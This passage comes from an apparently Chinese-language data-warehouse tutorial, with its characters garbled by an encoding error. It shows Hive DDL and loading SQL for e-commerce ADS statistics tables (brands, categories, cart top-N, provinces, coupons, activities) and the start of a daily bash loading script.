â€˜æœ€è¿‘å¤©æ•°,1:æœ€è¿‘1å¤©,7:æœ€è¿‘7å¤©,30:æœ€è¿‘30å¤©â€™,</p><p>`tm_id` STRING COMMENT â€˜å“ç‰ŒIDâ€™,</p><p>`tm_name` STRING COMMENT â€˜å“ç‰Œåç§°â€™,</p><p>`order_count` BIGINT COMMENT â€˜è®¢å•æ•°â€™,</p><p>`order_user_count` BIGINT COMMENT â€˜è®¢å•äººæ•°â€™,</p><p>`order_refund_count` BIGINT COMMENT â€˜é€€å•æ•°â€™,</p><p>`order_refund_user_count` BIGINT COMMENT â€˜é€€å•äººæ•°â€™</p><p>) COMMENT â€˜å„å“ç‰Œå•†å“äº¤æ˜“ç»Ÿè®¡â€™</p><p>ROW FORMAT DELIMITED FIELDS TERMINATED BY â€˜\tâ€™</p><p>LOCATION â€˜/warehouse/gmall/ads/ads_trade_stats_by_tm/â€˜;</p><p><strong>2ï¼‰æ•°æ®è£…è½½</strong></p><p>insert overwrite table ads_trade_stats_by_tm</p><p>select * from ads_trade_stats_by_tm</p><p>union</p><p>select</p><p>â€˜2020-06-14â€™ dt,</p><p>nvl(odr.recent_days,refund.recent_days),</p><p>nvl(odr.tm_id,refund.tm_id),</p><p>nvl(odr.tm_name,refund.tm_name),</p><p>nvl(order_count,0),</p><p>nvl(order_user_count,0),</p><p>nvl(order_refund_count,0),</p><p>nvl(order_refund_user_count,0)</p><p>from</p><p>(</p><p>select</p><p>1 recent_days,</p><p>tm_id,</p><p>tm_name,</p><p>sum(order_count_1d) order_count,</p><p>count(distinct(user_id)) order_user_count</p><p>from dws_trade_user_sku_order_1d</p><p>where dt=â€™2020-06-14â€™</p><p>group by tm_id,tm_name</p><p>union all</p><p>select</p><p>recent_days,</p><p>tm_id,</p><p>tm_name,</p><p>sum(order_count),</p><p>count(distinct(if(order_count&gt;0,user_id,null)))</p><p>from</p><p>(</p><p>select</p><p>recent_days,</p><p>user_id,</p><p>tm_id,</p><p>tm_name,</p><p>case recent_days</p><p>when 7 then order_count_7d</p><p>when 30 then order_count_30d</p><p>end order_count</p><p>from dws_trade_user_sku_order_nd lateral view explode(array(7,30)) tmp as<br>recent_days</p><p>where dt=â€™2020-06-14â€™</p><p>)t1</p><p>group by recent_days,tm_id,tm_name</p><p>)odr</p><p>full outer join</p><p>(</p><p>select</p><p>1 recent_days,</p><p>tm_id,</p><p>tm_name,</p><p>sum(order_refund_count_1d) order_refund_count,</p><p>count(distinct(user_id)) order_refund_user_count</p><p>from dws_trade_user_sku_order_refund_1d</p><p>where dt=â€™2020-06-14â€™</p><p>group by tm_id,tm_name</p><p>union all</p><p>select</p><p>recent_days,</p><p>tm_id,</p><p>tm_name,</p><p>sum(order_refund_count),</p><p>count(if(order_refund_count&gt;0,user_id,null))</p><p>from</p><p>(</p><p>select</p><p>recent_days,</p><p>user_id,</p><p>tm_id,</p><p>tm_name,</p><p>case recent_days</p><p>when 7 then order_refund_count_7d</p><p>when 30 then order_refund_count_30d</p><p>end order_refund_count</p><p>from dws_trade_user_sku_order_refund_nd lateral view explode(array(7,30)) tmp as<br>recent_days</p><p>where dt=â€™2020-06-14â€™</p><p>)t1</p><p>group by recent_days,tm_id,tm_name</p><p>)refund</p><p>on odr.recent_days=refund.recent_days</p><p>and odr.tm_id=refund.tm_id</p><p>and odr.tm_name=refund.tm_name;</p><h4 id="å„å“ç±»å•†å“äº¤æ˜“ç»Ÿè®¡"><a href="#å„å“ç±»å•†å“äº¤æ˜“ç»Ÿè®¡" class="headerlink" title="å„å“ç±»å•†å“äº¤æ˜“ç»Ÿè®¡"></a>å„å“ç±»å•†å“äº¤æ˜“ç»Ÿè®¡</h4><p>éœ€æ±‚è¯´æ˜å¦‚ä¸‹</p><table><thead><tr><th>ç»Ÿè®¡å‘¨æœŸ</th><th>ç»Ÿè®¡ç²’åº¦</th><th>æŒ‡æ ‡</th><th>è¯´æ˜</th></tr></thead><tbody><tr><td>æœ€è¿‘1ã€7ã€30æ—¥</td><td>å“ç±»</td><td>è®¢å•æ•°</td><td>ç•¥</td></tr><tr><td>æœ€è¿‘1ã€7ã€30æ—¥</td><td>å“ç±»</td><td>è®¢å•äººæ•°</td><td>ç•¥</td></tr><tr><td>æœ€è¿‘1ã€7ã€30æ—¥</td><td>å“ç±»</td><td>é€€å•æ•°</td><td>ç•¥</td></tr><tr><td>æœ€è¿‘1ã€7ã€30æ—¥</td><td>å“ç±»</td><td>é€€å•äººæ•°</td><td>ç•¥</td></tr></tbody></table><p><strong>1ï¼‰å»ºè¡¨è¯­å¥</strong></p><p>DROP TABLE IF EXISTS ads_trade_stats_by_cate;</p><p>CREATE EXTERNAL TABLE ads_trade_stats_by_cate</p><p>(</p><p>`dt` STRING COMMENT â€˜ç»Ÿè®¡æ—¥æœŸâ€™,</p><p>`recent_days` BIGINT COMMENT â€˜æœ€è¿‘å¤©æ•°,1:æœ€è¿‘1å¤©,7:æœ€è¿‘7å¤©,30:æœ€è¿‘30å¤©â€™,</p><p>`category1_id` STRING COMMENT â€˜ä¸€çº§åˆ†ç±»idâ€™,</p><p>`category1_name` STRING COMMENT â€˜ä¸€çº§åˆ†ç±»åç§°â€™,</p><p>`category2_id` STRING COMMENT â€˜äºŒçº§åˆ†ç±»idâ€™,</p><p>`category2_name` STRING COMMENT â€˜äºŒçº§åˆ†ç±»åç§°â€™,</p><p>`category3_id` STRING COMMENT â€˜ä¸‰çº§åˆ†ç±»idâ€™,</p><p>`category3_name` STRING COMMENT â€˜ä¸‰çº§åˆ†ç±»åç§°â€™,</p><p>`order_count` BIGINT COMMENT â€˜è®¢å•æ•°â€™,</p><p>`order_user_count` BIGINT COMMENT â€˜è®¢å•äººæ•°â€™,</p><p>`order_refund_count` BIGINT COMMENT â€˜é€€å•æ•°â€™,</p><p>`order_refund_user_count` BIGINT COMMENT â€˜é€€å•äººæ•°â€™</p><p>) COMMENT â€˜å„åˆ†ç±»å•†å“äº¤æ˜“ç»Ÿè®¡â€™</p><p>ROW FORMAT DELIMITED FIELDS TERMINATED BY â€˜\tâ€™</p><p>LOCATION â€˜/warehouse/gmall/ads/ads_trade_stats_by_cate/â€˜;</p><p><strong>2ï¼‰æ•°æ®è£…è½½</strong></p><p>insert overwrite table ads_trade_stats_by_cate</p><p>select * from ads_trade_stats_by_cate</p><p>union</p><p>select</p><p>â€˜2020-06-14â€™ dt,</p><p>nvl(odr.recent_days,refund.recent_days),</p><p>nvl(odr.category1_id,refund.category1_id),</p><p>nvl(odr.category1_name,refund.category1_name),</p><p>nvl(odr.category2_id,refund.category2_id),</p><p>nvl(odr.category2_name,refund.category2_name),</p><p>nvl(odr.category3_id,refund.category3_id),</p><p>nvl(odr.category3_name,refund.category3_name),</p><p>nvl(order_count,0),</p><p>nvl(order_user_count,0),</p><p>nvl(order_refund_count,0),</p><p>nvl(order_refund_user_count,0)</p><p>from</p><p>(</p><p>select</p><p>1 recent_days,</p><p>category1_id,</p><p>category1_name,</p><p>category2_id,</p><p>category2_name,</p><p>category3_id,</p><p>category3_name,</p><p>sum(order_count_1d) order_count,</p><p>count(distinct(user_id)) order_user_count</p><p>from dws_trade_user_sku_order_1d</p><p>where dt=â€™2020-06-14â€™</p><p>group by<br>category1_id,category1_name,category2_id,category2_name,category3_id,category3_name</p><p>union all</p><p>select</p><p>recent_days,</p><p>category1_id,</p><p>category1_name,</p><p>category2_id,</p><p>category2_name,</p><p>category3_id,</p><p>category3_name,</p><p>sum(order_count),</p><p>count(distinct(if(order_count&gt;0,user_id,null)))</p><p>from</p><p>(</p><p>select</p><p>recent_days,</p><p>user_id,</p><p>category1_id,</p><p>category1_name,</p><p>category2_id,</p><p>category2_name,</p><p>category3_id,</p><p>category3_name,</p><p>case recent_days</p><p>when 7 then order_count_7d</p><p>when 30 then order_count_30d</p><p>end order_count</p><p>from dws_trade_user_sku_order_nd lateral view explode(array(7,30)) tmp as<br>recent_days</p><p>where dt=â€™2020-06-14â€™</p><p>)t1</p><p>group by<br>recent_days,category1_id,category1_name,category2_id,category2_name,category3_id,category3_name</p><p>)odr</p><p>full outer join</p><p>(</p><p>select</p><p>1 recent_days,</p><p>category1_id,</p><p>category1_name,</p><p>category2_id,</p><p>category2_name,</p><p>category3_id,</p><p>category3_name,</p><p>sum(order_refund_count_1d) order_refund_count,</p><p>count(distinct(user_id)) order_refund_user_count</p><p>from dws_trade_user_sku_order_refund_1d</p><p>where dt=â€™2020-06-14â€™</p><p>group by<br>category1_id,category1_name,category2_id,category2_name,category3_id,category3_name</p><p>union all</p><p>select</p><p>recent_days,</p><p>category1_id,</p><p>category1_name,</p><p>category2_id,</p><p>category2_name,</p><p>category3_id,</p><p>category3_name,</p><p>sum(order_refund_count),</p><p>count(distinct(if(order_refund_count&gt;0,user_id,null)))</p><p>from</p><p>(</p><p>select</p><p>recent_days,</p><p>user_id,</p><p>category1_id,</p><p>category1_name,</p><p>category2_id,</p><p>category2_name,</p><p>category3_id,</p><p>category3_name,</p><p>case recent_days</p><p>when 7 then order_refund_count_7d</p><p>when 30 then order_refund_count_30d</p><p>end order_refund_count</p><p>from dws_trade_user_sku_order_refund_nd lateral view explode(array(7,30)) tmp as<br>recent_days</p><p>where dt=â€™2020-06-14â€™</p><p>)t1</p><p>group by<br>recent_days,category1_id,category1_name,category2_id,category2_name,category3_id,category3_name</p><p>)refund</p><p>on odr.recent_days=refund.recent_days</p><p>and odr.category1_id=refund.category1_id</p><p>and odr.category1_name=refund.category1_name</p><p>and odr.category2_id=refund.category2_id</p><p>and odr.category2_name=refund.category2_name</p><p>and odr.category3_id=refund.category3_id</p><p>and odr.category3_name=refund.category3_name;</p><h4 id="å„åˆ†ç±»å•†å“è´­ç‰©è½¦å­˜é‡Top10"><a href="#å„åˆ†ç±»å•†å“è´­ç‰©è½¦å­˜é‡Top10" class="headerlink" title="å„åˆ†ç±»å•†å“è´­ç‰©è½¦å­˜é‡Top10"></a>å„åˆ†ç±»å•†å“è´­ç‰©è½¦å­˜é‡Top10</h4><p><strong>1ï¼‰å»ºè¡¨è¯­å¥</strong></p><p>DROP TABLE IF EXISTS ads_sku_cart_num_top3_by_cate;</p><p>CREATE EXTERNAL TABLE ads_sku_cart_num_top3_by_cate</p><p>(</p><p>`dt` STRING COMMENT â€˜ç»Ÿè®¡æ—¥æœŸâ€™,</p><p>`category1_id` STRING COMMENT â€˜ä¸€çº§åˆ†ç±»IDâ€™,</p><p>`category1_name` STRING COMMENT â€˜ä¸€çº§åˆ†ç±»åç§°â€™,</p><p>`category2_id` STRING COMMENT â€˜äºŒçº§åˆ†ç±»IDâ€™,</p><p>`category2_name` STRING COMMENT â€˜äºŒçº§åˆ†ç±»åç§°â€™,</p><p>`category3_id` STRING COMMENT â€˜ä¸‰çº§åˆ†ç±»IDâ€™,</p><p>`category3_name` STRING COMMENT â€˜ä¸‰çº§åˆ†ç±»åç§°â€™,</p><p>`sku_id` STRING COMMENT â€˜å•†å“idâ€™,</p><p>`sku_name` STRING COMMENT â€˜å•†å“åç§°â€™,</p><p>`cart_num` BIGINT COMMENT â€˜è´­ç‰©è½¦ä¸­å•†å“æ•°é‡â€™,</p><p>`rk` BIGINT COMMENT â€˜æ’åâ€™</p><p>) COMMENT â€˜å„åˆ†ç±»å•†å“è´­ç‰©è½¦å­˜é‡Top10â€™</p><p>ROW FORMAT DELIMITED FIELDS TERMINATED BY â€˜\tâ€™</p><p>LOCATION â€˜/warehouse/gmall/ads/ads_sku_cart_num_top3_by_cate/â€˜;</p><p><strong>2ï¼‰æ•°æ®è£…è½½</strong></p><p>insert overwrite table ads_sku_cart_num_top3_by_cate</p><p>select * from ads_sku_cart_num_top3_by_cate</p><p>union</p><p>select</p><p>â€˜2020-06-14â€™ dt,</p><p>category1_id,</p><p>category1_name,</p><p>category2_id,</p><p>category2_name,</p><p>category3_id,</p><p>category3_name,</p><p>sku_id,</p><p>sku_name,</p><p>cart_num,</p><p>rk</p><p>from</p><p>(</p><p>select</p><p>sku_id,</p><p>sku_name,</p><p>category1_id,</p><p>category1_name,</p><p>category2_id,</p><p>category2_name,</p><p>category3_id,</p><p>category3_name,</p><p>cart_num,</p><p>rank() over (partition by category1_id,category2_id,category3_id order by<br>cart_num desc) rk</p><p>from</p><p>(</p><p>select</p><p>sku_id,</p><p>sum(sku_num) cart_num</p><p>from dwd_trade_cart_full</p><p>where dt=â€™2020-06-14â€™</p><p>group by sku_id</p><p>)cart</p><p>left join</p><p>(</p><p>select</p><p>id,</p><p>sku_name,</p><p>category1_id,</p><p>category1_name,</p><p>category2_id,</p><p>category2_name,</p><p>category3_id,</p><p>category3_name</p><p>from dim_sku_full</p><p>where dt=â€™2020-06-14â€™</p><p>)sku</p><p>on cart.sku_id=sku.id</p><p>)t1</p><p>where rk&lt;=3;</p><h3 id="äº¤æ˜“ä¸»é¢˜"><a href="#äº¤æ˜“ä¸»é¢˜" class="headerlink" title="äº¤æ˜“ä¸»é¢˜"></a>äº¤æ˜“ä¸»é¢˜</h3><h4 id="äº¤æ˜“ç»¼åˆç»Ÿè®¡"><a href="#äº¤æ˜“ç»¼åˆç»Ÿè®¡" class="headerlink" title="äº¤æ˜“ç»¼åˆç»Ÿè®¡"></a>äº¤æ˜“ç»¼åˆç»Ÿè®¡</h4><p>éœ€æ±‚è¯´æ˜å¦‚ä¸‹</p><table><thead><tr><th>ç»Ÿè®¡å‘¨æœŸ</th><th>æŒ‡æ ‡</th><th>è¯´æ˜</th></tr></thead><tbody><tr><td>æœ€è¿‘1ã€7ã€30æ—¥</td><td>è®¢å•æ€»é¢</td><td>è®¢å•æœ€ç»ˆé‡‘é¢</td></tr><tr><td>æœ€è¿‘1ã€7ã€30æ—¥</td><td>è®¢å•æ•°</td><td>ç•¥</td></tr><tr><td>æœ€è¿‘1ã€7ã€30æ—¥</td><td>è®¢å•äººæ•°</td><td>ç•¥</td></tr><tr><td>æœ€è¿‘1ã€7ã€30æ—¥</td><td>é€€å•æ•°</td><td>ç•¥</td></tr><tr><td>æœ€è¿‘1ã€7ã€30æ—¥</td><td>é€€å•äººæ•°</td><td>ç•¥</td></tr></tbody></table><p><strong>1ï¼‰å»ºè¡¨è¯­å¥</strong></p><p>DROP TABLE IF EXISTS ads_trade_stats;</p><p>CREATE EXTERNAL TABLE ads_trade_stats</p><p>(</p><p>`dt` STRING COMMENT â€˜ç»Ÿè®¡æ—¥æœŸâ€™,</p><p>`recent_days` BIGINT COMMENT â€˜æœ€è¿‘å¤©æ•°,1:æœ€è¿‘1æ—¥,7:æœ€è¿‘7å¤©,30:æœ€è¿‘30å¤©â€™,</p><p>`order_total_amount` DECIMAL(16, 2) COMMENT â€˜è®¢å•æ€»é¢,GMVâ€™,</p><p>`order_count` BIGINT COMMENT â€˜è®¢å•æ•°â€™,</p><p>`order_user_count` BIGINT COMMENT â€˜ä¸‹å•äººæ•°â€™,</p><p>`order_refund_count` BIGINT COMMENT â€˜é€€å•æ•°â€™,</p><p>`order_refund_user_count` BIGINT COMMENT â€˜é€€å•äººæ•°â€™</p><p>) COMMENT â€˜äº¤æ˜“ç»Ÿè®¡â€™</p><p>ROW FORMAT DELIMITED FIELDS TERMINATED BY â€˜\tâ€™</p><p>LOCATION â€˜/warehouse/gmall/ads/ads_trade_stats/â€˜;</p><p><strong>2ï¼‰æ•°æ®è£…è½½</strong></p><p>insert overwrite table ads_trade_stats</p><p>select * from ads_trade_stats</p><p>union</p><p>select</p><p>â€˜2020-06-14â€™,</p><p>odr.recent_days,</p><p>order_total_amount,</p><p>order_count,</p><p>order_user_count,</p><p>order_refund_count,</p><p>order_refund_user_count</p><p>from</p><p>(</p><p>select</p><p>1 recent_days,</p><p>sum(order_total_amount_1d) order_total_amount,</p><p>sum(order_count_1d) order_count,</p><p>count(*) order_user_count</p><p>from dws_trade_user_order_1d</p><p>where dt=â€™2020-06-14â€™</p><p>union all</p><p>select</p><p>recent_days,</p><p>sum(order_total_amount),</p><p>sum(order_count),</p><p>sum(if(order_count&gt;0,1,0))</p><p>from</p><p>(</p><p>select</p><p>recent_days,</p><p>case recent_days</p><p>when 7 then order_total_amount_7d</p><p>when 30 then order_total_amount_30d</p><p>end order_total_amount,</p><p>case recent_days</p><p>when 7 then order_count_7d</p><p>when 30 then order_count_30d</p><p>end order_count</p><p>from dws_trade_user_order_nd lateral view explode(array(7,30)) tmp as<br>recent_days</p><p>where dt=â€™2020-06-14â€™</p><p>)t1</p><p>group by recent_days</p><p>)odr</p><p>join</p><p>(</p><p>select</p><p>1 recent_days,</p><p>sum(order_refund_count_1d) order_refund_count,</p><p>count(*) order_refund_user_count</p><p>from dws_trade_user_order_refund_1d</p><p>where dt=â€™2020-06-14â€™</p><p>union all</p><p>select</p><p>recent_days,</p><p>sum(order_refund_count),</p><p>sum(if(order_refund_count&gt;0,1,0))</p><p>from</p><p>(</p><p>select</p><p>recent_days,</p><p>case recent_days</p><p>when 7 then order_refund_count_7d</p><p>when 30 then order_refund_count_30d</p><p>end order_refund_count</p><p>from dws_trade_user_order_refund_nd lateral view explode(array(7,30)) tmp as<br>recent_days</p><p>where dt=â€™2020-06-14â€™</p><p>)t1</p><p>group by recent_days</p><p>)refund</p><p>on odr.recent_days=refund.recent_days;</p><h4 id="å„çœä»½äº¤æ˜“ç»Ÿè®¡"><a href="#å„çœä»½äº¤æ˜“ç»Ÿè®¡" class="headerlink" title="å„çœä»½äº¤æ˜“ç»Ÿè®¡"></a>å„çœä»½äº¤æ˜“ç»Ÿè®¡</h4><p>éœ€æ±‚è¯´æ˜å¦‚ä¸‹</p><table><thead><tr><th>ç»Ÿè®¡å‘¨æœŸ</th><th>ç»Ÿè®¡ç²’åº¦</th><th>æŒ‡æ ‡</th><th>è¯´æ˜</th></tr></thead><tbody><tr><td>æœ€è¿‘1ã€7ã€30æ—¥</td><td>çœä»½</td><td>è®¢å•æ•°</td><td>ç•¥</td></tr><tr><td>æœ€è¿‘1ã€7ã€30æ—¥</td><td>çœä»½</td><td>è®¢å•é‡‘é¢</td><td>ç•¥</td></tr></tbody></table><p><strong>1ï¼‰å»ºè¡¨è¯­å¥</strong></p><p>DROP TABLE IF EXISTS ads_order_by_province;</p><p>CREATE EXTERNAL TABLE ads_order_by_province</p><p>(</p><p>`dt` STRING COMMENT â€˜ç»Ÿè®¡æ—¥æœŸâ€™,</p><p>`recent_days` BIGINT COMMENT â€˜æœ€è¿‘å¤©æ•°,1:æœ€è¿‘1å¤©,7:æœ€è¿‘7å¤©,30:æœ€è¿‘30å¤©â€™,</p><p>`province_id` STRING COMMENT â€˜çœä»½IDâ€™,</p><p>`province_name` STRING COMMENT â€˜çœä»½åç§°â€™,</p><p>`area_code` STRING COMMENT â€˜åœ°åŒºç¼–ç â€™,</p><p>`iso_code` STRING COMMENT â€˜å›½é™…æ ‡å‡†åœ°åŒºç¼–ç â€™,</p><p>`iso_code_3166_2` STRING COMMENT â€˜å›½é™…æ ‡å‡†åœ°åŒºç¼–ç â€™,</p><p>`order_count` BIGINT COMMENT â€˜è®¢å•æ•°â€™,</p><p>`order_total_amount` DECIMAL(16, 2) COMMENT â€˜è®¢å•é‡‘é¢â€™</p><p>) COMMENT â€˜å„åœ°åŒºè®¢å•ç»Ÿè®¡â€™</p><p>ROW FORMAT DELIMITED FIELDS TERMINATED BY â€˜\tâ€™</p><p>LOCATION â€˜/warehouse/gmall/ads/ads_order_by_province/â€˜;</p><p><strong>2ï¼‰æ•°æ®è£…è½½</strong></p><p>insert overwrite table ads_order_by_province</p><p>select * from ads_order_by_province</p><p>union</p><p>select</p><p>â€˜2020-06-14â€™ dt,</p><p>1 recent_days,</p><p>province_id,</p><p>province_name,</p><p>area_code,</p><p>iso_code,</p><p>iso_3166_2,</p><p>order_count_1d,</p><p>order_total_amount_1d</p><p>from dws_trade_province_order_1d</p><p>where dt=â€™2020-06-14â€™</p><p>union</p><p>select</p><p>â€˜2020-06-14â€™ dt,</p><p>recent_days,</p><p>province_id,</p><p>province_name,</p><p>area_code,</p><p>iso_code,</p><p>iso_3166_2,</p><p>sum(order_count),</p><p>sum(order_total_amount)</p><p>from</p><p>(</p><p>select</p><p>recent_days,</p><p>province_id,</p><p>province_name,</p><p>area_code,</p><p>iso_code,</p><p>iso_3166_2,</p><p>case recent_days</p><p>when 7 then order_count_7d</p><p>when 30 then order_count_30d</p><p>end order_count,</p><p>case recent_days</p><p>when 7 then order_total_amount_7d</p><p>when 30 then order_total_amount_30d</p><p>end order_total_amount</p><p>from dws_trade_province_order_nd lateral view explode(array(7,30)) tmp as<br>recent_days</p><p>where dt=â€™2020-06-14â€™</p><p>)t1</p><p>group by recent_days,province_id,province_name,area_code,iso_code,iso_3166_2;</p><h3 id="ä¼˜æƒ åˆ¸ä¸»é¢˜"><a href="#ä¼˜æƒ åˆ¸ä¸»é¢˜" class="headerlink" title="ä¼˜æƒ åˆ¸ä¸»é¢˜"></a>ä¼˜æƒ åˆ¸ä¸»é¢˜</h3><h4 id="æœ€è¿‘30å¤©å‘å¸ƒçš„ä¼˜æƒ åˆ¸çš„è¡¥è´´ç‡"><a href="#æœ€è¿‘30å¤©å‘å¸ƒçš„ä¼˜æƒ åˆ¸çš„è¡¥è´´ç‡" class="headerlink" title="æœ€è¿‘30å¤©å‘å¸ƒçš„ä¼˜æƒ åˆ¸çš„è¡¥è´´ç‡"></a>æœ€è¿‘30å¤©å‘å¸ƒçš„ä¼˜æƒ åˆ¸çš„è¡¥è´´ç‡</h4><p>éœ€æ±‚è¯´æ˜å¦‚ä¸‹</p><table><thead><tr><th>ç»Ÿè®¡ç²’åº¦</th><th>æŒ‡æ ‡</th><th>è¯´æ˜</th></tr></thead><tbody><tr><td>ä¼˜æƒ åˆ¸</td><td>è¡¥è´´ç‡</td><td>ç”¨åˆ¸çš„è®¢å•æ˜ç»†ä¼˜æƒ åˆ¸å‡å…é‡‘é¢æ€»å’Œ/åŸå§‹é‡‘é¢æ€»å’Œ</td></tr></tbody></table><p><strong>1ï¼‰å»ºè¡¨è¯­å¥</strong></p><p>DROP TABLE IF EXISTS ads_coupon_stats;</p><p>CREATE EXTERNAL TABLE ads_coupon_stats</p><p>(</p><p>`dt` STRING COMMENT â€˜ç»Ÿè®¡æ—¥æœŸâ€™,</p><p>`coupon_id` STRING COMMENT â€˜ä¼˜æƒ åˆ¸IDâ€™,</p><p>`coupon_name` STRING COMMENT â€˜ä¼˜æƒ åˆ¸åç§°â€™,</p><p>`start_date` STRING COMMENT â€˜å‘å¸ƒæ—¥æœŸâ€™,</p><p>`rule_name` STRING COMMENT â€˜ä¼˜æƒ è§„åˆ™ï¼Œä¾‹å¦‚æ»¡100å…ƒå‡10å…ƒâ€™,</p><p>`reduce_rate` DECIMAL(16, 2) COMMENT â€˜è¡¥è´´ç‡â€™</p><p>) COMMENT â€˜ä¼˜æƒ åˆ¸ç»Ÿè®¡â€™</p><p>ROW FORMAT DELIMITED FIELDS TERMINATED BY â€˜\tâ€™</p><p>LOCATION â€˜/warehouse/gmall/ads/ads_coupon_stats/â€˜;</p><p><strong>2ï¼‰æ•°æ®è£…è½½</strong></p><p>insert overwrite table ads_coupon_stats</p><p>select * from ads_coupon_stats</p><p>union</p><p>select</p><p>â€˜2020-06-14â€™ dt,</p><p>coupon_id,</p><p>coupon_name,</p><p>start_date,</p><p>coupon_rule,</p><p>cast(coupon_reduce_amount_30d/original_amount_30d as decimal(16,2))</p><p>from dws_trade_coupon_order_nd</p><p>where dt=â€™2020-06-14â€™;</p><h3 id="æ´»åŠ¨ä¸»é¢˜"><a href="#æ´»åŠ¨ä¸»é¢˜" class="headerlink" title="æ´»åŠ¨ä¸»é¢˜"></a>æ´»åŠ¨ä¸»é¢˜</h3><h4 id="æœ€è¿‘30å¤©å‘å¸ƒçš„æ´»åŠ¨çš„è¡¥è´´ç‡"><a href="#æœ€è¿‘30å¤©å‘å¸ƒçš„æ´»åŠ¨çš„è¡¥è´´ç‡" class="headerlink" title="æœ€è¿‘30å¤©å‘å¸ƒçš„æ´»åŠ¨çš„è¡¥è´´ç‡"></a>æœ€è¿‘30å¤©å‘å¸ƒçš„æ´»åŠ¨çš„è¡¥è´´ç‡</h4><p>éœ€æ±‚è¯´æ˜å¦‚ä¸‹</p><table><thead><tr><th>ç»Ÿè®¡ç²’åº¦</th><th>æŒ‡æ ‡</th><th>è¯´æ˜</th></tr></thead><tbody><tr><td>æ´»åŠ¨</td><td>è¡¥è´´ç‡</td><td>å‚ä¸ä¿ƒé”€æ´»åŠ¨çš„è®¢å•æ˜ç»†æ´»åŠ¨å‡å…é‡‘é¢æ€»å’Œ/åŸå§‹é‡‘é¢æ€»å’Œ</td></tr></tbody></table><p><strong>1ï¼‰å»ºè¡¨è¯­å¥</strong></p><p>DROP TABLE IF EXISTS ads_activity_stats;</p><p>CREATE EXTERNAL TABLE ads_activity_stats</p><p>(</p><p>`dt` STRING COMMENT â€˜ç»Ÿè®¡æ—¥æœŸâ€™,</p><p>`activity_id` STRING COMMENT â€˜æ´»åŠ¨IDâ€™,</p><p>`activity_name` STRING COMMENT â€˜æ´»åŠ¨åç§°â€™,</p><p>`start_date` STRING COMMENT â€˜æ´»åŠ¨å¼€å§‹æ—¥æœŸâ€™,</p><p>`reduce_rate` DECIMAL(16, 2) COMMENT â€˜è¡¥è´´ç‡â€™</p><p>) COMMENT â€˜æ´»åŠ¨ç»Ÿè®¡â€™</p><p>ROW FORMAT DELIMITED FIELDS TERMINATED BY â€˜\tâ€™</p><p>LOCATION â€˜/warehouse/gmall/ads/ads_activity_stats/â€˜;</p><p><strong>2ï¼‰æ•°æ®è£…è½½</strong></p><p>insert overwrite table ads_activity_stats</p><p>select * from ads_activity_stats</p><p>union</p><p>select</p><p>â€˜2020-06-14â€™ dt,</p><p>activity_id,</p><p>activity_name,</p><p>start_date,</p><p>cast(activity_reduce_amount_30d/original_amount_30d as decimal(16,2))</p><p>from dws_trade_activity_order_nd</p><p>where dt=â€™2020-06-14â€™;</p><h3 id="æ•°æ®è£…è½½è„šæœ¬-6"><a href="#æ•°æ®è£…è½½è„šæœ¬-6" class="headerlink" title="æ•°æ®è£…è½½è„šæœ¬"></a>æ•°æ®è£…è½½è„šæœ¬</h3><p><strong>1ï¼‰æ¯æ—¥æ•°æ®è£…è½½è„šæœ¬</strong></p><p>ï¼ˆ1ï¼‰åœ¨hadoop102çš„/home/atguigu/binç›®å½•ä¸‹åˆ›å»ºdws_to_ads.sh</p><p>[atguigu@hadoop102 bin]$ vim dws_to_ads.sh</p><p>ï¼ˆ2ï¼‰ç¼–å†™å¦‚ä¸‹å†…å®¹</p><p>##!/bin/bash</p><p>APP=gmall</p><p>## å¦‚æœæ˜¯è¾“å…¥çš„æ—¥æœŸæŒ‰ç…§å–è¾“å…¥æ—¥æœŸï¼›å¦‚æœæ²¡è¾“å…¥æ—¥æœŸå–å½“å‰æ—¶é—´çš„å‰ä¸€å¤©</p><p>if [ -n â€œ$2â€ ] ;then</p><p>do_date=$2</p><p>else</p><p>do_date=`date -d â€œ-1 dayâ€ +%F`</p><p>fi</p><p>ads_activity_stats=â€</p><p>insert overwrite table ${APP}.ads_activity_stats</p><p>select * from ${APP}.ads_activity_stats</p><p>union</p><p>select</p><p>â€˜$do_dateâ€™ dt,</p><p>activity_id,</p><p>activity_name,</p><p>start_date,</p><p>cast(activity_reduce_amount_30d/original_amount_30d as decimal(16,2))</p><p>from ${APP}.dws_trade_activity_order_nd</p><p>where dt=â€™$do_dateâ€™;</p><p>â€œ</p><p>ads_coupon_stats=â€</p><p>insert overwrite table ${APP}.ads_coupon_stats</p><p>select * from ${APP}.ads_coupon_stats</p><p>union</p><p>select</p><p>â€˜$do_dateâ€™ dt,</p><p>coupon_id,</p><p>coupon_name,</p><p>start_date,</p><p>coupon_rule,</p><p>cast(coupon_reduce_amount_30d/original_amount_30d as decimal(16,2))</p><p>from ${APP}.dws_trade_coupon_order_nd</p><p>where dt=â€™$do_dateâ€™;</p><p>â€œ</p><p>ads_new_buyer_stats=â€</p><p>insert overwrite table ${APP}.ads_new_buyer_stats</p><p>select * from ${APP}.ads_new_buyer_stats</p><p>union</p><p>select</p><p>â€˜$do_dateâ€™,</p><p>odr.recent_days,</p><p>new_order_user_count,</p><p>new_payment_user_count</p><p>from</p><p>(</p><p>select</p><p>recent_days,</p><p>sum(if(order_date_first&gt;=date_add(â€˜$do_dateâ€™,-recent_days+1),1,0))<br>new_order_user_count</p><p>from ${APP}.dws_trade_user_order_td lateral view explode(array(1,7,30)) tmp as<br>recent_days</p><p>where dt=â€™$do_dateâ€™</p><p>group by recent_days</p><p>)odr</p><p>join</p><p>(</p><p>select</p><p>recent_days,</p><p>sum(if(payment_date_first&gt;=date_add(â€˜$do_dateâ€™,-recent_days+1),1,0))<br>new_payment_user_count</p><p>from ${APP}.dws_trade_user_payment_td lateral view explode(array(1,7,30)) tmp<br>as recent_days</p><p>where dt=â€™$do_dateâ€™</p><p>group by recent_days</p><p>)pay</p><p>on odr.recent_days=pay.recent_days;</p><p>â€œ</p><p>ads_order_by_province=â€</p><p>insert overwrite table ${APP}.ads_order_by_province</p><p>select * from ${APP}.ads_order_by_province</p><p>union</p><p>select</p><p>â€˜$do_dateâ€™ dt,</p><p>1 recent_days,</p><p>province_id,</p><p>province_name,</p><p>area_code,</p><p>iso_code,</p><p>iso_3166_2,</p><p>order_count_1d,</p><p>order_total_amount_1d</p><p>from ${APP}.dws_trade_province_order_1d</p><p>where dt=â€™$do_dateâ€™</p><p>union</p><p>select</p><p>â€˜$do_dateâ€™ 